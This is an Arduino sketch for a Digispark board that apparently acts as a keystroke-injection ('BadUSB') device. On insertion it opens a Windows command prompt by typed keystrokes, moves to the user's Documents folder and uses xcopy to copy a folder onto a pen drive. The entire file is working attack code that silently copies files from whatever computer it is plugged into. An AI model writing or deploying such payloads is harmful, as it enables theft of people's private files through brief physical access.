#include <DigiKeyboard.h>

void setup() {
  // Give some time for the computer to recognize Digispark
  DigiKeyboard.delay(2000);
  // Open the Run dialog (Windows + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  // Type 'cmd' and press Enter to open Command Prompt
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Change the directory to the pen drive (replace 'X:' with the actual drive letter of your pen drive)
//  DigiKeyboard.print("E:");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(1000);
//  // Create a new folder on the pen drive (if it doesn't exist)
//  DigiKeyboard.print("mkdir MyCopiedFolder");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(1000);
  // Change the directory to the Documents folder
  DigiKeyboard.print("cd %userprofile%\\Documents");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Copy the contents of specific folder to the new folder on the pen drive
  DigiKeyboard.print("xcopy /E /Y hello E:\\MyCopiedFolder");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  // Close the Command Prompt
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void loop() {
  // Your script has completed its task
  while (1) {
    DigiKeyboard.delay(500);
  }
}
